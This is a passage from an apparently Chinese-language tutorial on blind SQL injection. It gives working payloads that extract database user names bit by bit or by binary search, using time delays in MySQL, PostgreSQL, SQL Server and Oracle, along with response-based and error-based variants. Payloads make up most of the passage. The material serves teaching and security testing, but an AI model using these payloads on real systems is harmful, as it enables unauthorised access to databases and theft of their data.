Incubating'</span> <span class="token operator">AND</span> ASCII<span class="token punctuation">(</span>SUBSTRING <span class="token punctuation">(</span>SYSTEM <span class="token keyword">USER</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&gt;</span><span class="token number">111</span><span class="token comment">-- (True)</span>
Incubating<span class="token string">' AND ASCII(SUBSTRING (SYSTEM USER,1,1)) &gt;119-- (False)
Incubating'</span> <span class="token operator">AND</span> ASCII<span class="token punctuation">(</span>SUBSTRING <span class="token punctuation">(</span>SYSTEM <span class="token keyword">USER</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&gt;</span><span class="token number">115</span><span class="token comment">-- (False)</span>
Incubating<span class="token string">' AND ASCII(SUBSTRING (SYSTEM USER,1,1)) &gt;113-- (True)
Incubating'</span> <span class="token operator">AND</span> ASCII<span class="token punctuation">(</span>SUBSTRING <span class="token punctuation">(</span>SYSTEM <span class="token keyword">USER</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&gt;</span><span class="token number">114</span><span class="token comment">-- (True)</span>

<span class="token comment">-- 自建字母表，优化二分法</span>
Incubating<span class="token string">' and SUBSTRING ('</span>c4ca4238a0b923820dcc509a6f75849b<span class="token string">',1,1) in
('</span><span class="token number">0</span><span class="token string">','</span><span class="token number">1</span><span class="token string">','</span><span class="token number">2</span><span class="token string">','</span><span class="token number">3</span><span class="token string">','</span><span class="token number">4</span><span class="token string">','</span><span class="token number">5</span><span class="token string">','</span><span class="token number">6</span><span class="token string">','</span><span class="token number">7</span>'<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
<li><p>逐位方法</p>
<p><img src="https://images.dadream.eu.org/images/2024/07/304ab8debee5bb56e02a5703f7ad7fba.png"></p>
<p>对每位（bit）进行比对</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">Incubating<span class="token string">'
AND ASCII (SUBSTRING (SYSTEM USER, 1, 1)) &amp;
128-128-- (False)
Incubating'</span>
<span class="token operator">AND</span> ASCII <span class="token punctuation">(</span>SUBSTRING <span class="token punctuation">(</span>SYSTEM <span class="token keyword">USER</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>
<span class="token number">64</span><span class="token operator">=</span><span class="token number">64</span><span class="token comment">-- (True)</span>
Incubating<span class="token string">'
AND ASCII (SUBSTRING (SYSTEM USER, 1,1)) &amp;
32=32-- (True)
Incubating'</span>
<span class="token operator">AND</span> ASCII <span class="token punctuation">(</span>SUBSTRING <span class="token punctuation">(</span>SYSTEM <span class="token keyword">USER</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token operator">&amp;</span> <span class="token number">16</span><span class="token operator">=</span><span class="token number">16</span><span class="token comment">-- (True)</span>
Incubating<span class="token string">' AND ASCII (SUBSTRING (SYSTEM USER, 1, 1)) &amp; 8=8-- (False)
Incubating'</span> <span class="token operator">AND</span> ASCII <span class="token punctuation">(</span>SUBSTRING <span class="token punctuation">(</span>SYSTEM <span class="token keyword">USER</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">4</span><span class="token operator">=</span><span class="token number">4</span><span class="token comment">-- (False)</span>
Incubating<span class="token string">'
AND ASCII (SUBSTRING (SYSTEM USER, 1,1))
&amp; 2=2-- (True)
Incubating'</span>
<span class="token operator">AND</span> ASCII <span class="token punctuation">(</span>SUBSTRING <span class="token punctuation">(</span>SYSTEM <span class="token keyword">USER</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token operator">&amp;</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span><span class="token comment">-- (True)</span>

<span class="token comment">-- ture代表1，false代表0，比对出得到01110011，十进制115，字母s</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
</ul>
<h5 id="非主流通道技术"><a href="#非主流通道技术" class="headerlink" title="非主流通道技术"></a>非主流通道技术</h5><p>用的传输通道而非页面响应，它的传输通道包括DNS、e-mail和HTTP请求。非主流通道技术更重要的特点是：它们通常支持一次检索多块数据，而不是推断单个位或单个字节的值。</p>
<h3 id="使用基于时间技术"><a href="#使用基于时间技术" class="headerlink" title="使用基于时间技术"></a>使用基于时间技术</h3><p>发出请求到响应到达这段时间的差异。当某一状态为真时，如果能够让响应暂停几秒钟， 而当状态为假时，能够不出现暂停</p>
<h4 id="延迟数据库查询"><a href="#延迟数据库查询" class="headerlink" title="延迟数据库查询"></a>延迟数据库查询</h4><h5 id="Mysql延迟"><a href="#Mysql延迟" class="headerlink" title="Mysql延迟"></a>Mysql延迟</h5><p> 两个函数，sleep()，benchmark(n,expression)</p>
<p>sleep(N)强制延迟N秒</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">xxx<span class="token punctuation">.</span>php?canshu<span class="token operator">=</span><span class="token number">1</span><span class="token string">' union select if(substring(user(),1,4)='</span>root'<span class="token punctuation">,</span>sleep<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>benchmark(N,expression)执行表达式expression N次，通常表达式为一个函数，这样能增加执行时间</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">xxx<span class="token punctuation">.</span>php?canshu<span class="token operator">=</span><span class="token number">1</span><span class="token string">' union select if(substring(user(),1,4)='</span>root'<span class="token punctuation">,</span>benchmark<span class="token punctuation">(</span><span class="token number">100000000</span><span class="token punctuation">,</span>rand<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>通常<code>'root'</code>写成16进制0x726f6f74（只编码了root），只用可以去掉单引号</p>
<ul>
<li><p>二分法</p>
<p>依然是两种状态，延迟和未延迟</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">' <span class="token keyword">UNION</span> <span class="token keyword">SELECT</span> <span class="token keyword">IF</span> <span class="token punctuation">(</span>ASCII<span class="token punctuation">(</span>SUBSTRING<span class="token punctuation">(</span><span class="token punctuation">(</span>……<span class="token punctuation">)</span><span class="token punctuation">,</span>i<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&gt;</span>k<span class="token punctuation">,</span>SLEEP<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">' <span class="token keyword">UNION</span> <span class="token keyword">SELECT</span> <span class="token keyword">IF</span> <span class="token punctuation">(</span>ASCII<span class="token punctuation">(</span>SUBSTRING<span class="token punctuation">(</span><span class="token punctuation">(</span>……<span class="token punctuation">)</span><span class="token punctuation">,</span>i<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&gt;</span>k<span class="token punctuation">,</span>benchmark<span class="token punctuation">(</span><span class="token number">100000000</span><span class="token punctuation">,</span>rand<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>k是二分中间值</p>
</li>
<li><p>逐位</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token string">' UNION SELECT IF (ASCII (SUBSTRING ((……), i, 1))&amp;2^j =2^j,SLEEP(1), 1) # 
'</span> <span class="token keyword">UNION</span> <span class="token keyword">SELECT</span> <span class="token keyword">IF</span> <span class="token punctuation">(</span>ASCII <span class="token punctuation">(</span>SUBSTRING <span class="token punctuation">(</span><span class="token punctuation">(</span>……<span class="token punctuation">)</span><span class="token punctuation">,</span> i<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">2</span><span class="token operator">^</span>j <span class="token operator">=</span><span class="token number">2</span><span class="token operator">^</span>j<span class="token punctuation">,</span>BENCHMARK<span class="token punctuation">(</span><span class="token number">100000000</span><span class="token punctuation">,</span> RAND<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li>
</ul>
<p>一部分注入在where字句中，这时延迟会在匹配表中每一行都会执行一次，时间会很长</p>
<h5 id="PostgreSQL延迟技术"><a href="#PostgreSQL延迟技术" class="headerlink" title="PostgreSQL延迟技术"></a>PostgreSQL延迟技术</h5><p>8.1或者更低的版本，使用系统库的sleep()函数创建一个函数</p>
<p>8.2及更高的版本，不是用sleep，提供了一个函数<code>pg_sleep()</code>，默认安装，返回值是void，不能直接放在where子句中</p>
<p>解决方法，PostgreSQL能使用堆叠查询，第二个查询返回void，将由当前正在执行的应用程序进行处理，这会导致一个错误，当前程序将会失败，添加第三个哑查询，返回正确数量的列。</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> reviews <span class="token keyword">WHERE</span> review_author<span class="token operator">=</span><span class="token string">'MadBob'</span><span class="token punctuation">;</span> <span class="token keyword">SELECT</span> <span class="token keyword">CASE</span> <span class="token number">1</span> <span class="token keyword">WHEN</span> <span class="token number">1</span> <span class="token keyword">THEN</span> pg_sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">END</span><span class="token punctuation">;</span> <span class="token keyword">SELECT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span><span class="token boolean">NULL</span><span class="token punctuation">,</span><span class="token boolean">NULL</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>另一种解决方法，如果拥有创建PL/pgSQL函数的权限，可以创建一个新函数来封装pg_sleep()，并使它的返回值不为void，这样就能替代pg_sleep()，数据库拥有者必须为每个数据库单独启用PL/pgSQL语言。</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">CREATE</span> <span class="token keyword">LANGUAGE</span> <span class="token string">'plpgsql'</span><span class="token punctuation">;</span> <span class="token comment">-- 启用PL/pgSQL</span>
<span class="token comment">-- 定义一个封装函数pause()</span>
<span class="token keyword">CREATE</span> <span class="token operator">OR</span> <span class="token keyword">REPLACE</span> <span class="token keyword">FUNCTION</span> pause<span class="token punctuation">(</span><span class="token keyword">integer</span><span class="token punctuation">)</span> <span class="token keyword">RETURNS</span> <span class="token keyword">integer</span> <span class="token keyword">AS</span> $$
<span class="token keyword">DECLARE</span>
wait alias <span class="token keyword">for</span> $<span class="token number">1</span><span class="token punctuation">;</span>
<span class="token keyword">BEGIN</span>
PERFORM pg_sleep<span class="token punctuation">(</span>wait<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">RETURN</span> <span class="token number">1</span><span class="token punctuation">;</span>
<span class="token keyword">END</span><span class="token punctuation">;</span>
$$ <span class="token keyword">LANGUAGE</span> <span class="token string">'plpgsql'</span> STRICT<span class="token punctuation">;</span>
<span class="token comment">-- 调用</span>
xxx<span class="token punctuation">.</span>php?id<span class="token operator">=</span><span class="token number">1</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token keyword">SELECT</span> <span class="token keyword">CASE</span> <span class="token punctuation">(</span><span class="token keyword">SELECT</span> usename <span class="token keyword">FROM</span> pg_user <span class="token keyword">WHERE</span> usesuper <span class="token operator">IS</span> <span class="token boolean">TRUE</span> <span class="token operator">and</span> <span class="token keyword">current_user</span><span class="token operator">=</span>usename<span class="token punctuation">)</span> <span class="token keyword">WHEN</span> <span class="token punctuation">(</span><span class="token keyword">user</span><span class="token punctuation">)</span> <span class="token keyword">THEN</span> PAUSE<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span> <span class="token keyword">ELSE</span> <span class="token number">1</span> <span class="token keyword">END</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<ul>
<li><p>二分法</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token string">';SELECT CASE WHEN (ASCII (SUBSTR (..., i,1)) &gt; k) THEN pg_sleep(1) END; SELECT NULL,...,NULL;-- 
'</span><span class="token operator">||</span><span class="token punctuation">(</span><span class="token keyword">SELECT</span> <span class="token keyword">CASE</span> <span class="token keyword">WHEN</span> <span class="token punctuation">(</span>ASCII<span class="token punctuation">(</span>SUBSTR<span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">,</span>i<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&gt;</span> k<span class="token punctuation">)</span> <span class="token keyword">THEN</span> PAUSE <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">ELSE</span> <span class="token number">1</span> <span class="token keyword">END</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">-- </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
</li>
<li><p>逐位</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token string">';SELECT CASE WHEN (ASCII (SUBSTR (...,i,1)) &amp;2^j=2^j) THEN pg_sleep(1) END; SELECT NULL,...,NULL;
'</span><span class="token operator">||</span> <span class="token punctuation">(</span><span class="token keyword">SELECT</span> <span class="token keyword">CASE</span> <span class="token keyword">WHEN</span> <span class="token punctuation">(</span>ASCII <span class="token punctuation">(</span>SUBSTR<span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">,</span>i<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">2</span><span class="token operator">^</span>j<span class="token operator">=</span><span class="token number">2</span><span class="token operator">^</span>j<span class="token punctuation">)</span> <span class="token keyword">THEN</span> PAUSE <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">ELSE</span> <span class="token number">1</span> <span class="token keyword">END</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">-- </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li>
</ul>
<h5 id="SQL-Server延迟"><a href="#SQL-Server延迟" class="headerlink" title="SQL Server延迟"></a>SQL Server延迟</h5><p><code>waitfor delay '00:01:00'</code>将正常执行时间增加1分钟，waitfor delay不能在where子句中使用，能使用堆叠查询</p>
<p>SQL server驱动程序会把第一个查询输出返回给正在执行处理的程序，分号前面的会返回给后面的语句</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token function">COUNT</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token keyword">FROM</span> reviews <span class="token keyword">WHERE</span> review_author<span class="token operator">=</span><span class="token string">'MadBob'</span><span class="token punctuation">;</span> <span class="token keyword">IF</span> <span class="token keyword">SYSTEM_USER</span><span class="token operator">=</span><span class="token string">'sa'</span> <span class="token keyword">WAITFOR</span> DELAY <span class="token string">'00:00:05'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>如果用户名为sa，返回时间就大于5秒</p>
<p>还有一种新技术，该技术使用两个通过逻辑“与”隔开的子查询，其中一个子查询的执行时间为很多秒，另一个子查询包含一个推断检查。如果检查失败(第x位为0)，第二个子查询将返回，第一个子查询则因受“与”子句的影响而提前中止。实际结果是，如果正在推断的位为1，那么请求将花费比位为0时更多的时间。（其他数据库通用）<a target="_blank" rel="noopener" href="https://archive.codeplex.com/?p=marathontool">Marathon Tool - CodePlex Archive</a></p>
<ul>
<li><p>二分法</p>
</li>
<li><pre><code class="sql">;IF ASCII(SUBSTRING((...),i,1))&gt;k WAITFOR DELAY '00:00:05';-- 
<pre class="line-numbers language-none"><code class="language-none">
- 逐位

  ```sql
  ;IF ASCII (SUBSTRING ((...),i,1))&amp;2^j=2^j WAITFOR DELAY '00:00:05';--<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</code></pre>
</li>
</ul>
<h5 id="Oracle延迟"><a href="#Oracle延迟" class="headerlink" title="Oracle延迟"></a>Oracle延迟</h5><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">BEGIN</span> DBMS_LOCK<span class="token punctuation">.</span>SLEEP<span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">END</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>oralce中许多SQL注入都指向DBMS_LOCK包，并且这个包必须在管理员下使用，同时oracle不支持堆叠查询，所以sleep(n)在SQL语句中不好利用</p>
<p>如果注入点位于PL/SQL块中，则能利用</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">IF</span> <span class="token punctuation">(</span>BITAND<span class="token punctuation">(</span>ASCII<span class="token punctuation">(</span>SUBSTR<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span><span class="token punctuation">,</span>i<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token operator">^</span>j<span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">2</span><span class="token operator">^</span>j<span class="token punctuation">)</span> <span class="token keyword">THEN</span> DBMS_LOCK<span class="token punctuation">.</span>SLEEP<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">END</span> <span class="token keyword">IF</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>使用DBMS_PIPE.RECEIVE_MESSAGE函数可以实现基于时间的 攻击</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">xxx<span class="token punctuation">.</span>aspx?test<span class="token operator">=</span>test<span class="token string">'OR 1 = CASE WHEN
SYS_CONTEXT('</span>USERENV<span class="token string">', '</span>ISDBA<span class="token string">') = '</span><span class="token boolean">TRUE</span><span class="token string">' THEN DBMS_PIPE.RECEIVE_ MESSAGE('</span>foo'<span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token keyword">ELSE</span> <span class="token number">1</span> <span class="token keyword">END</span> <span class="token comment">-- </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<h4 id="基于时间的推断应考虑的问题"><a href="#基于时间的推断应考虑的问题" class="headerlink" title="基于时间的推断应考虑的问题"></a>基于时间的推断应考虑的问题</h4><p>如果请求延迟很久，也可能是过载过高或者信道拥堵</p>
<p>解决方法</p>
<ol>
<li>将延迟尽量设置高些以抵消其他延迟</li>
<li>发送两个几乎相同的请求，比较两个延迟，一个可能是状态为0的延迟，一个是状态为1的延迟，加以推断</li>
</ol>
<h3 id="使用基于响应的请求"><a href="#使用基于响应的请求" class="headerlink" title="使用基于响应的请求"></a>使用基于响应的请求</h3><p>推断状态时，可以借助响应中包含的文本或在检查特定值时强制产生的错误。</p>
<h4 id="Mysql响应技术"><a href="#Mysql响应技术" class="headerlink" title="Mysql响应技术"></a>Mysql响应技术</h4><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token function">COUNT</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token keyword">FROM</span> reviews <span class="token keyword">WHERE</span> review_author<span class="token operator">=</span><span class="token string">'MadBob'</span>
<span class="token comment">#返回两条结果</span>

<span class="token keyword">SELECT</span> <span class="token function">COUNT</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token keyword">FROM</span> reviews <span class="token keyword">WHERE</span> review_author<span class="token operator">=</span><span class="token string">'MadBob'</span> <span class="token operator">AND</span> ASCII<span class="token punctuation">(</span>SUBSTRING<span class="token punctuation">(</span><span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>i<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">2</span><span class="token operator">^</span>J<span class="token operator">=</span><span class="token number">2</span><span class="token operator">^</span>J<span class="token comment">#</span>
<span class="token comment">#如果i位为1，条件为真，返回上面相同结果，i位为0则返回0条</span>

<span class="token comment">#平衡拆分技术</span>
<span class="token keyword">SELECT</span> <span class="token function">COUNT</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token keyword">FROM</span> reviews <span class="token keyword">WHERE</span> id<span class="token operator">=</span> <span class="token number">1</span>
<span class="token comment">#逐位方法(bit-by-bit)的拆分与平衡注入字符串为：</span>
<span class="token keyword">SELECT</span> <span class="token function">COUNT</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token keyword">FROM</span> reviews <span class="token keyword">WHERE</span> id<span class="token operator">=</span><span class="token number">1</span><span class="token operator">+</span><span class="token keyword">if</span><span class="token punctuation">(</span>ASCII<span class="token punctuation">(</span>SUBSTRING<span class="token punctuation">(</span><span class="token keyword">CURRENT_USER</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>i<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">2</span><span class="token operator">^</span>j<span class="token operator">=</span><span class="token number">2</span><span class="token operator">^</span>j<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span>

<span class="token comment">#无法修改</span>
<span class="token keyword">SELECT</span> <span class="token function">COUNT</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token keyword">FROM</span> reviews <span class="token keyword">WHERE</span> id<span class="token operator">=</span><span class="token keyword">IF</span><span class="token punctuation">(</span>ASCII<span class="token punctuation">(</span>SUBSTRING<span class="token punctuation">(</span><span class="token keyword">CURRENT_USER</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>i<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">2</span><span class="token operator">^</span>j<span class="token operator">=</span><span class="token number">2</span><span class="token operator">^</span>j<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">SELECT</span> table_name <span class="token keyword">FROM</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">WHERE</span> table_name <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">SELECT</span> table_name <span class="token keyword">FROM</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">#很明显，第二个子查询返回多行，这句SQL会报错，那么就会有两种状态</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>使用以PHP编写并以MySQL作为数据存储的应用时，在数据库查询执行过程中出现的错误不会产生引发通用错误页面的异常。调用页面必须检查mysql_query()是否返回FALSE,或者mysql_error()是否返回一个非空字符串。只要有一个条件成立，页面就会打印一个应用专用的错误消息。这样做的结果是，MySQL错误不会产生HTTP 500响应代码，而是 产生正常的200响应代码。</p>
<h4 id="PostgreSQL响应技术"><a href="#PostgreSQL响应技术" class="headerlink" title="PostgreSQL响应技术"></a>PostgreSQL响应技术</h4><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token function">COUNT</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token keyword">FROM</span> reviews <span class="token keyword">WHERE</span> review_author<span class="token operator">=</span><span class="token string">'MadBob'</span> <span class="token operator">AND</span> ASCII<span class="token punctuation">(</span>SUBSTRING<span class="token punctuation">(</span><span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>i<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">2</span><span class="token operator">^</span>j<span class="token operator">=</span><span class="token number">2</span><span class="token operator">^</span>j<span class="token comment">-- </span>

<span class="token keyword">SELECT</span> <span class="token function">COUNT</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token keyword">FROM</span> reviews <span class="token keyword">WHERE</span> id<span class="token operator">=</span><span class="token number">1</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token keyword">SELECT</span> <span class="token keyword">CASE</span> <span class="token keyword">WHEN</span> <span class="token punctuation">(</span>ASCII<span class="token punctuation">(</span>SUBSTR<span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">,</span>i<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">2</span><span class="token operator">^</span>j<span class="token operator">=</span><span class="token number">2</span><span class="token operator">^</span>j<span class="token punctuation">)</span> <span class="token keyword">THEN</span> PAUSE <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">ELSE</span> <span class="token number">0</span> <span class="token keyword">END</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">--    </span>
<span class="token comment">#pause()是自定义的                                          </span>
<span class="token comment">#无法修改内容时，强制使用除以0的条件</span>
<span class="token keyword">SELECT</span> <span class="token keyword">CASE</span> <span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span><span class="token keyword">WHEN</span> <span class="token boolean">TRUE</span> <span class="token keyword">THEN</span> <span class="token number">1</span><span class="token operator">/</span><span class="token number">0</span> <span class="token keyword">END</span>
<span class="token comment">#很容易将它和拆分与平衡技术结合使用：</span>
<span class="token string">'||(SELECT CASE(...)WHEN TRUE THEN 1/0 END)||'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="SQL-Server响应技术"><a href="#SQL-Server响应技术" class="headerlink" title="SQL Server响应技术"></a>SQL Server响应技术</h4><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token function">COUNT</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token keyword">FROM</span> reviews <span class="token keyword">WHERE</span> review_author<span class="token operator">=</span><span class="token string">'MadBob'</span> <span class="token operator">and</span> <span class="token keyword">SYSTEM_USER</span><span class="token operator">=</span><span class="token string">'sa'</span>

<span class="token keyword">SELECT</span> <span class="token function">COUNT</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token keyword">FROM</span> reviews <span class="token keyword">WHERE</span> review_author<span class="token operator">=</span><span class="token string">'MadBob'</span> <span class="token operator">AND</span> ASCII<span class="token punctuation">(</span>SUBSTRING<span class="token punctuation">(</span><span class="token keyword">SYSTEM_USER</span><span class="token punctuation">,</span>i<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&gt;</span>k <span class="token comment">-- </span>

